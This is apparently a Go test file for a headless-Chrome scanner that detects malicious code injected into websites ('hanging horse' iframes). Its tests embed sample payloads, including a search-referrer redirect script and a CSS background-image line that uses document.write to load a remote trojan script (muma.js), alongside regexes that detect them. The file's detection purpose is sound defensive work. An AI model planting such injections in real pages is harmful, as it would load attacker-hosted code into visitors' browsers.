package agents

import (
	"context"
	"fmt"
	"github.com/TeaWeb/build/internal/teautils"
	"github.com/chromedp/cdproto/cdp"
	"github.com/chromedp/chromedp"
	"log"
	"regexp"
	"sync"
	"testing"
	"time"
)

func Test_run(t *testing.T) {
	before := time.Now()
	var err error
	url := "http://www.iyunke.net/"
	var ctxs chan context.Context
	for time.Now().Before(before.Add(2 * time.Hour)) {
		//任务并发执行的时候 一定会出现获取窗口达到上限，这里使用两小时内重复获取
		s := GenRandSecond()
		ctxs, err = getWindowCtx()
		if err != nil {
			<-time.Tick(time.Second * time.Duration(s))
		} else {
			break
		}
	}
	if err != nil {
		fmt.Println(err)
		return
	}
	en, html, err := chromeDpRun(url, <-ctxs)
	fmt.Println(en.Url, en.Location)
	//fmt.Println(*html[0])
	fmt.Println(err)
	domainTop, domain := en.GetDomain(url)
	Urls, _, err := en.GetUrlsAndCheck(html, domainTop, domain, url, 3)
	//监测结果
	if ok, res := en.checkIframeHangingHorse(html, url, domainTop); ok && len(res) > 0 {
		for k, v := range res {
			fmt.Println(k, v)
		}
	}
	fmt.Println(Urls)
	time.Sleep(time.Second * 5)
	//en, html, err = chromeDpRun("http://www.baidu.com", en.Context)
	//fmt.Println(en)
	//fmt.Println(html)
	//fmt.Println(err)
	//time.Sleep(time.Second * 5)
	en.Close()
}
func Test_run2(t *testing.T) {
	options := []chromedp.ExecAllocatorOption{
		chromedp.Flag("headless", false), // debug使用false  正式使用用true
		chromedp.WindowSize(1280, 1024),  // 调整浏览器大小
	}
	options = append(chromedp.DefaultExecAllocatorOptions[:], options...)
	options = append(options, chromedp.UserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"))
	options = append(options, chromedp.DisableGPU)
	options = append(options, chromedp.Flag("ignore-certificate-errors", true))       //忽略错误
	options = append(options, chromedp.Flag("blink-settings", "imagesEnabled=false")) //不加载图片
	//var cancel context.CancelFunc
	ctx, cancel1 := chromedp.NewExecAllocator(context.Background(), options...)
	fmt.Println(1)
	ctx, cancel2 := chromedp.NewRemoteAllocator(ctx, "ws://127.0.0.1:9222") //使用远程调试，可以结合下面的容器使用
	fmt.Println(2)

	ctx, cancel3 := chromedp.NewContext(ctx, chromedp.WithLogf(log.Printf)) // 会打开浏览器并且新建一个标签页进行操作
	fmt.Println(3)
	location, html, iframes := "", "", []*cdp.Node{}
	//err := chromedp.Run(ctx, chromedp.Navigate(`https://blog.csdn.net/`))
	err := chromedp.Run(ctx, chromedp.Tasks{
		chromedp.Navigate(`http://182.150.0.125/test.html`),
		chromedp.EvaluateAsDevTools("window.location.href;", &location),
		chromedp.OuterHTML("html", &html, chromedp.ByQueryAll),
		chromedp.Nodes("iframe", &iframes, chromedp.ByQueryAll),
	})
	fmt.Println(err)

	fmt.Println("location", location)
	fmt.Println("html", html)
	fmt.Println("iframe", iframes)
	time.Sleep(time.Second * 5)
	chromedp.Cancel(ctx)
	cancel1()
	cancel2()
	cancel3()
}

func Test_run3(t *testing.T) {
	// 禁用chrome headless
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", false),
	)
	allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer cancel()
	ctx, _ := chromedp.NewRemoteAllocator(allocCtx, "ws://127.0.0.1:9222") //使用远程调试，可以结合下面的容器使用

	// create chrome instance
	ctx, cancel = chromedp.NewContext(
		ctx,
		chromedp.WithLogf(log.Printf),
	)

	defer cancel()

	targets, err := chromedp.Targets(ctx)
	if err != nil {
		fmt.Println("err==", err)
		return
	}

	for _, v := range targets {
		fmt.Println(v.URL)
	}
	time.Sleep(time.Second * 10)
}

func Test_run4(t *testing.T) {
	// 禁用chrome headless
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", false),
	)
	allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer cancel()

	// create chrome instance
	ctx, cancel := chromedp.NewContext(
		allocCtx,
		chromedp.WithLogf(log.Printf),
	)
	defer cancel()

	// create a timeout
	ctx, cancel = context.WithTimeout(ctx, 5*time.Second)
	defer cancel()
	chromedp.Run(ctx, chromedp.Navigate(`https://baidu.com`))

	//chromedp.Cancel(ctx)
	time.Sleep(time.Second * 10)
}

func Test_reg1(t *testing.T) {
	content := `var search=document.referrer;
if(search.indexOf("baidu")>0 || search.indexOf("so")>0 || searchindexOf.("soso")>0 || search.indexOf("google")>0 || search.indexOf("youdao")>0 || search.indexOf("sougou")>0){
        self.location.href="https://www.baidu.com"
}`
	locationHrefRex, _ = regexp.Compile(`(window\.l|l|self\.l|this\.l)ocation\.href`)
	r := locationHrefRex.MatchString(content)
	fmt.Println(r)
}

func Test_reg2(t *testing.T) {
	content := `background-image: url(" 
javascript:document.write(\"<script src=http://www.djmp4.net/muma.js></script>\")')`
	//background-image: url('javascript:document.write("<script src=http://www.djmp4.net/muma.js></script>")')
	cssReg, e := regexp.Compile(`background-image\s{0,}\:\s{0,}url\([\s\'\"]{1,}javascript\:document\.write.*?\)`)
	if e != nil {
		fmt.Println(e)
		return
	}
	r := cssReg.FindString(content)
	fmt.Println(r)
}
func Test_getDomain(t *testing.T) {
	en := &ChromeDpEngine{}
	url := "https://www.cqwuxi.com/thread-1031441-1-1.html"
	fmt.Println(en.GetDomain(url))
	fmt.Println(en.GetUrl("//v.qq.com/txp/iframe/player.html?vid=m3366k2fvlr", "https://www.cqwuxi.com", "https://www.cqwuxi.com/thread-1031441-1-1.html"))
}

func Test_simplifyStr(t *testing.T) {
	str := `http://v.baidu.com/v?ct=301989888\u0026rn=20\u0026pn=0\u0026db=0\u0026s=25\u0026ie=utf-8, http://xueshu.baidu.com/, http://map.baidu.com, http://www.baidu.com/duty, http://ir.baidu.com, https://www.baidu.com/s?wd=%E4%B9%A0%E8%BF%91%E5%B9%B3%E4%BB%BB%E4%B8%AD%E5%A4%AE%E5%86%9B%E5%A7%94%E4%B8%BB%E5%B8%AD\u0026sa=fyb_n_homepage\u0026rsv_dl=fyb_n_homepage\u0026from=super\u0026cl=3\u0026tn=baidutop10\u0026fr=top1000\u0026rsv_idx=2\u0026hisfilter=1, https://www.baidu.com/s?wd=%E4%B8%AD%E5%85%B1%E4%BA%8C%E5%8D%81%E5%B1%8A%E4%B8%80%E4%B8%AD%E5%85%A8%E4%BC%9A%E5%85%AC%E6%8A%A5\u0026sa=fyb_n_homepage\u0026rsv_dl=fyb_n_homepage\u0026from=super\u0026cl=3\u0026tn=baidutop10\u0026fr=top1000\u0026rsv_idx=2\u0026hisfilter=1, https://b2b.baidu.com/s?fr=wwwt, http://tieba.baidu.com/, http://www.baidu.com/, http://e.baidu.com/ebaidu/home?refer=887, https://jiankang.baidu.com/widescreen/home, http://fanyi.baidu.com/, https://pan.baidu.com?from=1026962h, https://zhidao.baidu.com, https://www.baidu.com/s?wd=%E5%BE%AE%E8%A7%86%E9%A2%91%EF%BD%9C%E7%9B%9B%E4%BC%9A%E5%87%9D%E8%81%9A%E5%A5%8B%E8%BF%9B%E5%8A%9B%E9%87%8F\u0026sa=fyb_n_homepage\u0026rsv_dl=fyb_n_homepage\u0026from=super\u0026cl=3\u0026tn=baidutop10\u0026fr=top1000\u0026rsv_idx=2\u0026hisfilter=1, http://image.baidu.com/i?tn=baiduimage\u0026ps=1\u0026ct=201326592\u0026lm=-1\u0026cl=2\u0026nc=1\u0026ie=utf-8, https://e.baidu.com/?refer=1271, https://haokan.baidu.com/?sfrom=baidu-top, http://news.baidu.com, https://baike.baidu.com`
	fmt.Println(simplifyContent(str))
}

func Test_cache(t *testing.T) {
	c := teautils.New(5*time.Minute, 10*time.Minute)
	c.Set("icpTokenTime", "fffff", time.Duration(time.Second*1))
	//time.Sleep(time.Second * 3)
	v, ok := c.Get("icpTokenTime")
	fmt.Println(v, ok)
}

func Test_for(t *testing.T) {

	r := new(WeightRoundLoadBalance)
	r.Add("A", 4, 1, 0)
	r.Add("B", 4, 0, 0)
	r.Add("C", 4, 3, 0)
	fmt.Println(r.Get())
	fmt.Println(r.Get())
	fmt.Println(r.Get())
	fmt.Println(r.Get())
	fmt.Println(r.Get())
	fmt.Println(r.Get())
	fmt.Println(r.Get())
}

func Test_ch(t *testing.T) {
	ch := make(chan ChromeHost, 4)
	fmt.Println(len(ch))
	ch <- ChromeHost{
		Addr: "1",
	}
	ch <- ChromeHost{
		Addr: "2",
	}
	ch <- ChromeHost{
		Addr: "3",
	}
	ch <- ChromeHost{
		Addr: "4",
	}
	wg := sync.WaitGroup{}
	for i := 1; i < 10; i++ {
		wg.Add(1)
		go func(i int) {
			win := <-ch
			defer func() {
				ch <- win
				wg.Done()
			}()
			fmt.Println(win)
			//使用窗口
			time.Sleep(time.Second)
		}(i)

	}

	wg.Wait()
	fmt.Println("wai", len(ch))
	num := len(ch)
	for i := 1; i <= num; i++ {
		fmt.Println("i=", i)
		w := <-ch
		//取出窗口 并关闭
		fmt.Println(w)
	}

}

func Test_http(t *testing.T) {
	en := ChromeDpEngine{}
	res, err := en.getCss("Content/reset.css")
	fmt.Println(res)
	fmt.Println(err)

	cssReg, e := regexp.Compile(`background-image\s{0,}\:\s{0,}url\([\s\'\"]{1,}javascript\:document\.write.*?\)`)
	if e != nil {
		fmt.Println(e)
		return
	}
	r := cssReg.FindString(res)
	fmt.Println(r)
}

func Test_Rand(t *testing.T) {
	before := time.Now()
	for time.Now().Before(before.Add(2 * time.Minute)) {
		s := GenRandSecond()
		fmt.Println(s)
		<-time.Tick(time.Second * time.Duration(s))
	}
	fmt.Println("ok")
}
